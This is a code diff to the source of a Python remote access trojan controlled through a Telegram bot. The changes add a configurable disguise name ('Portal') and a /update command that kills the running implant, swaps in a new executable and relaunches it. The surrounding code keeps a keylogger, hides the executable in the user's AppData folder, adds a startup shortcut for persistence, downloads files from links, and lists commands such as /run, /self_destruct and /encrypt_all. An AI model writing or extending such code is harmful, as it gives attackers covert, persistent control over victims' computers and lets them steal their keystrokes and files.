@@ -6,8 +6,9 @@ from sys import argv, path, stdout 						# console output
 from json import loads 									# reading json from ipinfo.io
 from winshell import startup 							# persistence
 from tendo import singleton								# this makes the application exit if there's another instance already running
-from win32com.client import Dispatch					# used for WScript.Shell
+from win32com.client import Dispatch					# WScript.Shell
 from time import strftime, sleep					
+import psutil											# updating	
 import win32clipboard                                   # Register clipboard    
 import base64											# /encrypt_all
 import datetime											# /schedule
@@ -22,19 +23,21 @@ import pyHook, pythoncom 								# keylogger
 import socket											# internal IP
 import getpass											# get username
 import collections
-me = singleton.SingleInstance() 
+me = singleton.SingleInstance()
 # REPLACE THE LINE BELOW WITH THE TOKEN OF THE BOT YOU GENERATED!
 #token = 'nnnnnnnnn:lllllllllllllllllllllllllllllllllll'
-token = os.environ['RAT_TOKEN'] # you can set your environment variable as well
+token = os.environ['RAT_TOKEN'] 						# you can set your environment variable as well
+# This will be used for setting paths and related file io -- change to whatever you want
+app_name = 'Portal'
 # ADD YOUR chat_id TO THE LIST BELOW IF YOU WANT YOUR BOT TO ONLY RESPOND TO ONE PERSON!
 known_ids = []
-known_ids.append(os.environ['TELEGRAM_CHAT_ID']) # make sure to remove this line if you don't have this environment variable
-appdata_roaming_folder = os.environ['APPDATA']	# = 'C:\Users\Username\AppData\Roaming'
-# HIDING OPTIONS
-# ---------------------------------------------
-hide_folder = appdata_roaming_folder + r'\Portal'	# = 'C:\Users\Username\AppData\Roaming\Portal'
-compiled_name = 'portal.exe'	# Name of compiled .exe to hide in hide_folder, i.e 'C:\Users\Username\AppData\Roaming\Portal\portal.exe'
-# ---------------------------------------------
+known_ids.append(os.environ['TELEGRAM_CHAT_ID']) 		# make sure to remove this line if you don't have this environment variable
+appdata_roaming_folder = os.environ['APPDATA']			# = 'C:\Users\Username\AppData\Roaming'
+														# HIDING OPTIONS
+														# ---------------------------------------------
+hide_folder = appdata_roaming_folder + '\\' + app_name	# = 'C:\Users\Username\AppData\Roaming\Portal'
+compiled_name = app_name + '.exe'						# Name of compiled .exe to hide in hide_folder, i.e 'C:\Users\Username\AppData\Roaming\Portal\portal.exe'
+														# ---------------------------------------------
 target_shortcut = startup() + '\\' + compiled_name.replace('.exe', '.lnk')
 if not os.path.exists(hide_folder):
 	os.makedirs(hide_folder)
@@ -95,7 +98,6 @@ def internalIP():
 	
 def checkchat_id(chat_id):
 	return len(known_ids) == 0 or str(chat_id) in known_ids
-
 def get_curr_window():
 		user32 = ctypes.windll.user32
 		kernel32 = ctypes.windll.kernel32
@@ -135,7 +137,6 @@ def pressed_chars(event):
 		f.write(tofile)
 		f.close()
 	return not keyboardFrozen
-
 	# if event.Ascii > 32 and event.Ascii < 127:
 		# fp = open(log_file, 'a')
 		# data = chr(event.Ascii)
@@ -467,6 +468,19 @@ def handle(msg):
 						command = command.replace(targets, '')
 						msg = {'text' : command, 'chat' : { 'id' : chat_id }}
 						handle(msg)
+			elif command == '/update':
+				proc_name = app_name + '.exe'
+				if not os.path.exists(hide_folder + '\\updated.exe'):
+					response = 'Send updated.exe first.'
+				else:
+					for proc in psutil.process_iter():
+						# check whether the process name matches
+						if proc.name() == proc_name:
+							proc.kill()
+					os.rename(hide_folder + '\\' + proc_name, hide_folder + '\\' + proc_name + '.bak')
+					os.rename(hide_folder + '\\updated.exe', hide_folder + '\\' + proc_name)
+					os.system(hide_folder + '\\' + proc_name)
+					sys.exit()
 			elif command == '/help':
 				# functionalities dictionary: command:arguments
 				functionalities = { '/arp' : '', \
@@ -490,7 +504,8 @@ def handle(msg):
 						'/run':'<target_file>', \
 						'/self_destruct':'', \
 						'/tasklist':'', \
-						'/to':'<target_computer>, [other_target_computer]'}
+						'/to':'<target_computer>, [other_target_computer]',\
+						'/update':''}
 				response = "\n".join(command + ' ' + description for command,description in sorted(functionalities.items()))
 			else: # redirect to /help
 				msg = {'text' : '/help', 'chat' : { 'id' : chat_id }}
@@ -510,7 +525,7 @@ def handle(msg):
 			file = (requests.get(link, stream=True)).raw
 			with open(hide_folder + '\\' + file_name, 'wb') as out_file:
 				copyfileobj(file, out_file)
-			response = 'File received succesfully.'
+			response = 'File saved as ' + file_name
 		if response != '':
 			responses = split_string(4096, response)
 			for resp in responses:
